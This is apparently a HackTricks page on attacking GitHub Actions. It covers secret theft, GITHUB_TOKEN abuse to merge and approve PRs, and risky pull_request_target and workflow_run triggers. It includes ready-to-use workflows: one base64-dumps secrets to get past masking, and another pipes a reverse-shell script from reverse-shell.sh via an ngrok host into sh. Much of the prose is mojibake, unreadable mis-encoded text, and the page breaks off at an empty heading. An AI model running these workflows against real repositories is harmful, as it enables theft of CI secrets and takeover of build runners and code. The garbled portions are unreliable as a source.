# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

In this page you will find:

* A **summary of all the impacts** of an attacker managing to access a Github Action
* Different ways to **get access to an action**:
* Having **permissions** to create the action
* Abusing **pull request** related triggers
* Abusing **other external access** techniques
* **Pivoting** from an already compromised repo
* Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

In case you can **execute arbitrary Github actions/inject code** in a **repository**, you could be able to:

* **рдЪреЛрд░реА рдХрд░реЗрдВ** the **secrets** from that repo/organization.
* If you can only inject, you can steal whatever is already present in the workflow.
* Abuse **repo privileges** to access other platforms such as AWS and GCP.
* **Execute code in custom workers** (if custom workers are used) and try to pivot from there.
* **Overwrite** repository **code**.
* This depends on the privileges of the `GITHUB_TOKEN` (if any).
* **Compromise** **deployments** and other **artifacts**.
* If the code is deploying or storing something you could modify that and obtain some further access.

## GITHUB\_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.
{% endhint %}

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PR рдХреЛ рдордВрдЬреВрд░реА рджреЗрдВ" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR рдмрдирд╛рдПрдВ" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдЕрд╡рд╕рд░реЛрдВ рдкрд░ рдЖрдк **Github Actions envs рдпрд╛ secrets рдХреЗ рдЕрдВрджрд░ github рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЯреЛрдХрди рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдпреЗ рдЯреЛрдХрди рдЖрдкрдХреЛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдФрд░ рд╕рдВрдЧрдарди рдкрд░ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

<details>

<summary>Github Action рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ secrets рдХреА рд╕реВрдЪреА</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>рдЧреБрдкреНрддреЛрдВ рдХреЗ рд╕рд╛рде рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ Github Token рдХреЛ рджрд┐рдП рдЧрдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА **рд▓реЙрдЧреНрд╕** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд╕рдХреЗ:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## рдЕрдиреБрдордд рдирд┐рд╖реНрдкрд╛рджрди

{% hint style="info" %}
рдпрд╣ Github рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдорд╛рдорд▓рд╛ рдорд╛рдирддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╕рдВрдЧрдарди рдореЗрдВ рдПрдХ рдирдпрд╛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдмрдирд╛рдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░** рд╣реИ, рдпрд╛ **рдПрдХ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВред

рдпрджрд┐ рдЖрдк рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ рд╣реИрдВ, рддреЛ рдЖрдк рдмрд╕ [рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди рддрдХрдиреАрдХреЗрдВ](./#post-exploitation-techniques-from-inside-an-action) рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдирд┐рд░реНрдорд╛рдг рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрди

рдпрджрд┐ рд╕рдВрдЧрдарди рдХреЗ рд╕рджрд╕реНрдп **рдирдП рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЖрдк github рдХреНрд░рд┐рдпрд╛рдПрдБ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдПрдХ рдирдпрд╛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрдЧрдарди рд╕реНрддрд░ рдкрд░ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

### рдирдП рд╢рд╛рдЦрд╛ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрди

рдпрджрд┐ рдЖрдк **рдПрдХ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рдПрдХ рдирдИ рд╢рд╛рдЦрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рдПрдХ Github Action** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рд╕рд╛рдордЧреНрд░реА рдЕрдкрд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдлрд┐рд░ **рдирдИ рд╢рд╛рдЦрд╛ рд╕реЗ рдЙрд╕ рдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣ рдЖрдк **рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдФрд░ рд╕рдВрдЧрдарди рд╕реНрддрд░ рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** (рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдХреНрдпрд╛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ)ред

рдЖрдк рд╕рдВрд╢реЛрдзрд┐рдд рдХреНрд░рд┐рдпрд╛ рдХреЛ **рд╣рд╛рде рд╕реЗ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдм **PR рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдпрд╛ рдЬрдм **рдХреБрдЫ рдХреЛрдб рдкреБрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** (рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдХрд┐рддрдиреЗ рд╢реЛрд░ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
рд╡рд┐рднрд┐рдиреНрди рдЯреНрд░рд┐рдЧрд░реНрд╕ рд╣реИрдВ рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рджреВрд╕рд░реЗ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХрд╛ Github Action рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЙрди рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдЦрд░рд╛рдм рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдиреНрд╣реЗрдВ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### `pull_request`

рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдЯреНрд░рд┐рдЧрд░ **`pull_request`** рд╣рд░ рдмрд╛рд░ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ рдЬрдм рдПрдХ рдкреБрд▓ рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдХреБрдЫ рдЕрдкрд╡рд╛рджреЛрдВ рдХреЗ рд╕рд╛рде: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрджрд┐ рдпрд╣ **рдкрд╣рд▓реА рдмрд╛рд░** рд╣реИ рдЬрдм рдЖрдк **рд╕рд╣рдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ**, рддреЛ рдХреБрдЫ **рд░рдЦрд░рдЦрд╛рд╡рдХрд░реНрддрд╛** рдХреЛ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЗ **рдирд┐рд╖реНрдкрд╛рджрди** рдХреЛ **рд╕реНрд╡реАрдХреГрдд** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
рдЪреВрдВрдХрд┐ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реАрдорд╛** **рдкрд╣рд▓реА рдмрд╛рд░** рдпреЛрдЧрджрд╛рдирдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╣реИ, рдЖрдк **рдПрдХ рдорд╛рдиреНрдп рдмрдЧ/рдЯрд╛рдЗрдкреЛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ** рдореЗрдВ рдпреЛрдЧрджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ **рдЕрдкрдиреЗ рдирдП `pull_request` рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп PR рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ**ред

**рдореИрдВрдиреЗ рдЗрд╕рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдФрд░ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛**: ~~рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛрдЧрд╛ рдХрд┐рд╕реА рдРрд╕реЗ рд╡реНрдпрдХреНрддрд┐ рдХрд╛ рдирд╛рдо рд▓реЗрдХрд░ рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдирд╛ рдЬрд┐рд╕рдиреЗ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рдпреЛрдЧрджрд╛рди рджрд┐рдпрд╛ рдФрд░ рдЙрд╕рдХрд╛ рдЦрд╛рддрд╛ рд╣рдЯрд╛ рджрд┐рдпрд╛ред~~
{% endhint %}

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдФрд░ **рдЧреБрдкреНрддреЛрдВ рдХреА рдкрд╣реБрдВрдЪ** рдХреЛ рд▓рдХреНрд╖рд┐рдд рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рд░реЛрдХрддрд╛ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

> `GITHUB_TOKEN` рдХреЗ рдЕрдкрд╡рд╛рдж рдХреЗ рд╕рд╛рде, **рдЧреБрдкреНрддреЛрдВ рдХреЛ рд░рдирд░ рдХреЛ рдирд╣реАрдВ рд╕реМрдВрдкрд╛ рдЬрд╛рддрд╛** рдЬрдм рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдПрдХ **рдлреЛрд░реНрдХ рдХрд┐рдП рдЧрдП** рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **`GITHUB_TOKEN` рдореЗрдВ рдкреБрд▓ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ **рдкрдврд╝рдиреЗ рдХреА рдХреЗрд╡рд▓ рдЕрдиреБрдорддрд┐** рд╣реЛрддреА рд╣реИ **рдлреЛрд░реНрдХ рдХрд┐рдП рдЧрдП рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА** рд╕реЗред

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ Github Action рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдордирдорд╛рдиреЗ рдЪреАрдЬреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдордирдорд╛рдиреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХреЗред рд╣рд╛рд▓рд╛рдБрдХрд┐, рд╡рд╣ рдЧреБрдкреНрддреЛрдВ рдХреЛ рдЪреБрд░рд╛рдиреЗ рдпрд╛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рд╕реАрдорд╛рдПрдБ рд╣реИрдВред

{% hint style="danger" %}
**рд╣рд╛рдБ, рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ PR рдореЗрдВ рдЙрд╕ github action рдХреЛ рдмрджрд▓рддрд╛ рд╣реИ рдЬреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рддреЛ рдЙрд╕рдХрд╛ Github Action рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдореВрд▓ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХрд╛ рдирд╣реАрдВ!**
{% endhint %}

рдЪреВрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдкрд░ рднреА рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрддрд╛ рд╣реИ, рднрд▓реЗ рд╣реА `GITHUB_TOKEN` рдкрд░ рдЧреБрдкреНрдд рдпрд╛ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рди рд╣реЛ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рджреБрд╖реНрдЯ рдХрд▓рд╛рдХреГрддрд┐рдпрд╛рдБ рдЕрдкрд▓реЛрдб** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### **`pull_request_target`**

рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдЯреНрд░рд┐рдЧрд░ **`pull_request_target`** рдХреЛ рд▓рдХреНрд╖рд┐рдд рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдФрд░ **рдЧреБрдкреНрддреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ** рд╣реЛрддреА рд╣реИ (рдФрд░ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдорд╛рдВрдЧрддрд╛)ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдЯреНрд░рд┐рдЧрд░ **`pull_request_target`** **рдмреЗрд╕ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓рддрд╛ рд╣реИ** рдФрд░ PR рджреНрд╡рд╛рд░рд╛ рджрд┐рдП рдЧрдП рд╕рдВрджрд░реНрдн рдореЗрдВ рдирд╣реАрдВ (рддрд╛рдХрд┐ **рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рди рд╣реЛ**)ред `pull_request_target` рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рджреЗрдЦреЗрдВ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЗрд╕ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЦрддрд░рдирд╛рдХ рдЙрдкрдпреЛрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ [**рдЧрд┐рдЯрд╣рдм рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

рдпрд╣ рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЪреВрдВрдХрд┐ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рд╡рд╣ рд╣реИ рдЬреЛ **рдмреЗрд╕** рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реИ рдФрд░ **PR** рдореЗрдВ рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП **`pull_request_target`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ **рд╕реБрд░рдХреНрд╖рд┐рдд** рд╣реИ, рд▓реЗрдХрд┐рди рдХреБрдЫ **рдорд╛рдорд▓реЗ рд╣реИрдВ рдЬрд╣рд╛рдБ рдпрд╣ рдирд╣реАрдВ рд╣реИ**ред

рдФрд░ рдпрд╣ рдПрдХ **рдЧреБрдкреНрддреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ** рд╣реЛрдЧреАред

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) рдЯреНрд░рд┐рдЧрд░ рдПрдХ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЛ рдПрдХ рдЕрд▓рдЧ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрдм рдпрд╣ `рдкреВрд░реНрдг`, `рдЕрдиреБрд░реЛрдзрд┐рдд` рдпрд╛ `рдкреНрд░рдЧрддрд┐ рдореЗрдВ` рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдПрдХ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЛ рдЕрд▓рдЧ "рдкрд░реАрдХреНрд╖рдг рдЪрд▓рд╛рдПрдБ" рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЗ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдпрд╣ рдПрдХ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдкрд░ **рдирд┐рд░реНрднрд░** рд╣реИ рдЬрд┐рд╕реЗ рдПрдХ рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ **`pull_request`** рдпрд╛ **`pull_request_target`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкреНрд░реЗрд░рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдХреБрдЫ рдХрдордЬреЛрд░ рдЙрджрд╛рд╣рд░рдг [**рдЗрд╕ рдмреНрд▓реЙрдЧ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** рдкрд╣рд▓рд╛ рдЙрджрд╛рд╣рд░рдг **`workflow_run`** рджреНрд╡рд╛рд░рд╛ рдкреНрд░реЗрд░рд┐рдд рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рд╣реИ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдХреЛрдб рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИ: `${{ github.event.pull_request.head.sha }}`\
рджреВрд╕рд░рд╛ рдЙрджрд╛рд╣рд░рдг **`workflow_run`** рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдореЗрдВ **рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** рдХреЛрдб рд╕реЗ рдПрдХ **рдХрд▓рд╛рдХреГрддрд┐** **рдкрд╛рд╕** рдХрд░рдиреЗ рдФрд░ рдЗрд╕ рдХрд▓рд╛рдХреГрддрд┐ рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ **RCE рдХреЗ рд▓рд┐рдП рдХрдордЬреЛрд░** рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

### `workflow_call`

TODO

TODO: рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдЬрдм рдЗрд╕реЗ pull_request рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛/рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХреЛрдб рдореВрд▓ рд╕реЗ рд╣реИ рдпрд╛ рдлреЛрд░реНрдХ рдХрд┐рдП рдЧрдП PR рд╕реЗ

## Forked Execution рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

